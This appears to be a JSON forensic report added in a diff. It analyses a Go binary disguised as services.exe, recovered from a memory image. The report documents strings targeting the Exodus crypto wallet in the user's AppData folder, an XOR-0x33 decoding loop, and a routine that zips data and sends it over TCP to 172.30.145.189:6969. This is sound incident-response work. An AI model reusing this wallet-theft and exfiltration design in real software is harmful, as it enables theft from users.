@@ -1,0 +1,181 @@
+{
+  "artifact": {
+    "path": "store/jobs/j000223/out/file.0xab0b0d34fe90.0xab0b106cf320.ImageSectionObject.services.exe.img",
+    "sha256": "fa77c2c1076f47055a0a37a08e29eb88238489a3ca74ccd6b5187f31218b0cea",
+    "size": 3000832,
+    "image_base": "0x8c0000"
+  },
+  "go_pclntab": {
+    "file_offset": 1371040,
+    "nfunc": 2549,
+    "text_start": "0x8c1000",
+    "main_like_function": {
+      "start": "0x9a7220",
+      "end": "0x9a74dc",
+      "index": 2548
+    },
+    "xor_helper": {
+      "start": "0x9a6d60",
+      "end": "0x9a6e60",
+      "index": 2543
+    },
+    "network_helper": {
+      "start": "0x9a6f00",
+      "end": "0x9a7160",
+      "index": 2545
+    },
+    "note": "The sparse cached image preserves functab boundaries but zeros the corresponding custom-function name metadata pages."
+  },
+  "main_string_references": [
+    {
+      "at": "0x9a723a",
+      "file_offset": 944186,
+      "bytes_hex": "488d052f690300",
+      "target_va": "0x9ddb70",
+      "target_file_offset": 1165168,
+      "target_bytes_ascii": "USERPROFILECloseHandleOpenProcessunreachableGetFileType/dev/stdo"
+    },
+    {
+      "at": "0x9a728f",
+      "file_offset": 944271,
+      "bytes_hex": "488d0d125f0300",
+      "target_va": "0x9dd1a8",
+      "target_file_offset": 1162664,
+      "target_bytes_ascii": "AppdataRoamingreaddirwindowsconsole\\\\.\\UNCfloat32float64runningw"
+    },
+    {
+      "at": "0x9a72aa",
+      "file_offset": 944298,
+      "bytes_hex": "488d0dfe5e0300",
+      "target_va": "0x9dd1af",
+      "target_file_offset": 1162671,
+      "target_bytes_ascii": "Roamingreaddirwindowsconsole\\\\.\\UNCfloat32float64runningwsarecvw"
+    },
+    {
+      "at": "0x9a72c5",
+      "file_offset": 944325,
+      "bytes_hex": "488d0d325d0300",
+      "target_va": "0x9dcffe",
+      "target_file_offset": 1162238,
+      "target_bytes_ascii": "ExodusremoveStringFormat[]bytestringnetdns.localreturnlisten.oni"
+    },
+    {
+      "at": "0x9a72e0",
+      "file_offset": 944352,
+      "bytes_hex": "488d0d6d700300",
+      "target_va": "0x9de354",
+      "target_file_offset": 1167188,
+      "target_bytes_ascii": "exodus.walletFindFirstFilelame referraldalTLDpSugct?profMemActiv"
+    },
+    {
+      "at": "0x9a730f",
+      "file_offset": 944399,
+      "bytes_hex": "488d0560600300",
+      "target_va": "0x9dd376",
+      "target_file_offset": 1163126,
+      "target_bytes_ascii": "USERNAMEFullPathGoString[::1]:53continue_gatewayshutdownaddress "
+    },
+    {
+      "at": "0x9a7328",
+      "file_offset": 944424,
+      "bytes_hex": "488d3d365a0300",
+      "target_va": "0x9dcd65",
+      "target_file_offset": 1161573,
+      "target_bytes_ascii": ".zipreadpipefileopenStattrue) = dialbind \r\t\n on unixicmpigmpftps"
+    },
+    {
+      "at": "0x9a747a",
+      "file_offset": 944762,
+      "bytes_hex": "488d054f850300",
+      "target_va": "0x9df9d0",
+      "target_file_offset": 1172944,
+      "target_bytes_ascii": "172.30.145.189:6969WaitForSingleObjectreflect.Value.IsNilreflect"
+    }
+  ],
+  "main_control_flow": {
+    "xor_call": {
+      "at": "0x9a73b0",
+      "file_offset": 944560,
+      "bytes_hex": "e8abf9ffff",
+      "target": "0x9a6d60"
+    },
+    "aggregation_call_after_xor_outputs": {
+      "at": "0x9a740e",
+      "file_offset": 944654,
+      "bytes_hex": "e80df3ffff",
+      "target": "0x9a6720"
+    },
+    "payload_prepare_call": {
+      "at": "0x9a746f",
+      "file_offset": 944751,
+      "bytes_hex": "e8ecf9ffff",
+      "target": "0x9a6e60"
+    },
+    "payload_register_move_then_endpoint_and_send": {
+      "va": "0x9a746f",
+      "file_offset": 944751,
+      "bytes_hex": "e8ecf9ffff4889c14889df488d054f850300bb13000000e875faffff"
+    },
+    "endpoint_lea": {
+      "at": "0x9a747a",
+      "file_offset": 944762,
+      "bytes_hex": "488d054f850300",
+      "target_va": "0x9df9d0",
+      "target_file_offset": 1172944,
+      "target_bytes_ascii": "172.30.145.189:6969WaitForSingleObjectreflect.Value.IsNilreflect"
+    },
+    "network_helper_call": {
+      "at": "0x9a7486",
+      "file_offset": 944774,
+      "bytes_hex": "e875faffff",
+      "target": "0x9a6f00"
+    },
+    "decoded_register_flow": "The call at 0x9a746f returns AX/BX; instructions 48 89 c1 and 48 89 df move those values to CX/DI, then LEA loads the endpoint into AX, BB 13 loads length 19 into BX, and the call at 0x9a7486 targets 0x9a6f00."
+  },
+  "xor_helper_loop": {
+    "signature_file_offset": 943043,
+    "signature_va": "0x9a6dc3",
+    "bytes_hex": "0fb6341a83f6334088341848ffc34839d97fed",
+    "decoded": "MOVZX ESI,byte [RDX+RBX]; XOR ESI,0x33; MOV byte [RAX+RBX],SIL; INC RBX; CMP RCX,RBX; JG back to the byte loop."
+  },
+  "network_helper": {
+    "endpoint_to_network_args_and_tcp": {
+      "va": "0x9a6f40",
+      "file_offset": 943424,
+      "bytes_hex": "440f117c24584889c2488d05dd5c03004889debb030000004889d14889f76690e87b35fdff4885c90f85"
+    },
+    "tcp_lea": {
+      "at": "0x9a6f49",
+      "file_offset": 943433,
+      "bytes_hex": "488d05dd5c0300",
+      "target_va": "0x9dcc2d",
+      "target_file_offset": 1161261,
+      "target_bytes_ascii": "tcp\\\\?\\\\.\\??nilEOFudpdns::1setcgoftpsshfinptrobjgc %: gp  *(in  "
+    },
+    "first_call": {
+      "at": "0x9a6f60",
+      "file_offset": 943456,
+      "bytes_hex": "e87b35fdff",
+      "target": "0x97a4e0"
+    },
+    "first_call_error_test": {
+      "va": "0x9a6f60",
+      "file_offset": 943456,
+      "bytes_hex": "e87b35fdff4885c90f857601000048"
+    },
+    "payload_reload_and_open_like_call": {
+      "va": "0x9a6fc0",
+      "file_offset": 943552,
+      "bytes_hex": "8b8424c0000000488b9c24c8000000e88c3cfaff4885db0f85dc"
+    },
+    "copy_like_call_context": {
+      "va": "0x9a7010",
+      "file_offset": 943632,
+      "bytes_hex": "488d05096c0100e8a437f2ff488b5c2448488d0dc0370600488b7c244031f64531c04d89c1e866c1f9ff4885db743d"
+    },
+    "net_Dial_name_file_offset": 1450334,
+    "net_Dial_name_bytes": "net.Dial\u0000",
+    "decoded": "The helper saves CX/DI (payload string) at entry. It moves endpoint AX/BX into CX/DI, loads pointer to literal tcp into AX and length 3 into BX, and calls 0x97a4e0; RCX is immediately tested as the error interface. It later reloads the saved payload string and calls 0x94ac60, checks the returned error word, and passes the opened-object/result plus the connection into 0x9431a0 before deferred interface-method closes. This is the Go ABI/control-flow shape of net.Dial(\"tcp\", endpoint), opening the prepared payload, and copying it to the connection, but the sparse image lost the relevant symbol-address metadata; the retained net.Dial name string corroborates the first call family."
+  },
+  "boundary": "Static code establishes targeting, transformation and transmission capability/intent; it does not show that a connection or past transfer succeeded."
+}
